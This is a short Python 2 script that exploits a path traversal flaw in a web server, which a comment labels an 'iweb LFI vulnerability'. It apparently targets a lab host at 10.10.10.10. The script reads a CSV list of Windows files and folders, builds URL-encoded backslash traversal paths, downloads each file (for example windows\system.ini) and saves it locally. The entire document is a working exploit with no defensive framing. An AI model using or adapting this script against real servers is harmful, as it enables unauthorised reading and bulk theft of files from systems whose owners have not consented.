import requests
import csv
import sys

csv_file = "files_n_dirs.csv"
url = "http://10.10.10.10/"
lfi = "%5C..%5C..%5C..%5C..%5C"
path_delim_escape = "%5c"
path_delim = "\\"
path_remove = "C:%5c"
file_save_path = "./save/"

def getFile(file, folder):
    # iweb LFI vulnerability
    # http://10.10.10.10/%5C..%5C..%5C..%5C..%5Cwindows%5Csystem.ini
    file_parameter = folderEscape(folder) + path_delim_escape + file
    full_url = url+lfi+file_parameter
    print "Downloading: " + full_url ,
    try:
        r = requests.get(full_url, stream=True)
        print "... Connected",
        if r.status_code == 404:
            print " ... 404 FILE NOT FOUND!"
            return
    except:
        print "Unexpected error:", sys.exc_info()[0]
        print "... FAILED to connect!"
        return

    try:
        with open(file_save_path + file_parameter.replace(path_delim_escape, "_"), 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024):
                if chunk:  # filter out keep-alive new chunks
                    f.write(chunk)
        print "... File saved!"
    except:
        print "... FAILED to save file!" + sys.exc_info()[0]
        return

def folderEscape(folder):
    escape_folder = folder.replace(path_delim,path_delim_escape)
    escape_folder = escape_folder.replace(path_remove,"")
    return escape_folder

with open(csv_file, 'rb') as f:
    reader = csv.reader(f)
    for row in reader:
        getFile(row[0], row[1])

